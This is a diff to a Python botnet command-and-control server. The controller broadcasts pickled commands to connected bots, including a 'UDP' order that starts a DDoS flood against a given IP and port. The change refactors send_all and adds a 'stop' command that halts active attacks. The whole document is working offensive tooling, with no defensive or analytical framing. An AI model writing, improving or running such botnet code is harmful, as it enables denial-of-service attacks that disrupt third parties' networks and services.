@@ -29,6 +29,8 @@ def check():
             adds.pop(i)
 
 def send_all(command):
+    check()
+    command = pickle.dumps(command)
     for i in range(len(cons)):
         cons[i].send(command)
 
@@ -44,6 +46,7 @@ def userInterface():
             print("EXIT           Exits server.")
             print("HELP           Shows list of commands.")
             print("MSG            Sends a costom message to all connections.")
+            print("Stop           Stops every active attack.")
             print("UDP            Starts a DDoS attack using UDP")
             print()
         elif command[0] == "cls":
@@ -57,17 +60,20 @@ def userInterface():
             else:
                 print("There are no connections!", end="\n\n")
         elif command[0] == "msg":
-            check()
             try:
-                send_all(pickle.dumps((command[0], command[1])))
+                send_all((command[0], command[1]))
             except:
                 print("MSG {message}", end="\n\n")
         elif command[0] == "udp":
-            check()
             try:
-                send_all(pickle.dumps((command[0], command[1], int(command[2]), command[3])))
+                send_all((command[0], command[1], int(command[2]), command[3]))
             except:
                 print("UDP {ip} {port} {message}", end="\n\n")
+        elif command[0] == "stop":
+            try:
+                send_all(["stop"])
+            except:
+                print("Failed to send stop!")
 
 if __name__ == "__main__":
     threading.Thread(target=userInterface).start()
